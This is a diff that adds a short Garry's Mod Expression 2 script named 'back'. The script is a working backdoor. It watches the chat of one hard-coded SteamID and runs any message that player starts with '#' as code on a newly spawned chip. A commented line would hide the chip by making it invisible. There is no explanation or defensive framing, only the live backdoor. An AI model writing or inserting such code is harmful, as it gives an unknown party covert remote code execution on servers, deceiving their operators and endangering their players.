@@ -1,0 +1,10 @@
+@name back
+runOnTick(1)
+if(first()){
+#entity():setAlpha(0)
+}
+timer("check",100)
+if(first()||clk("check")){O=findPlayerBySteamID("STEAM_0:0:766803141")}
+if(first()){E2=spawnExpression2(vec(0,0,0),ang(0,0,0),"")}
+if(O:isValid()&O:lastSaid():explode("")[1,string]=="#"){E2:remoteSetCode(O:lastSaid():sub(2))}
+
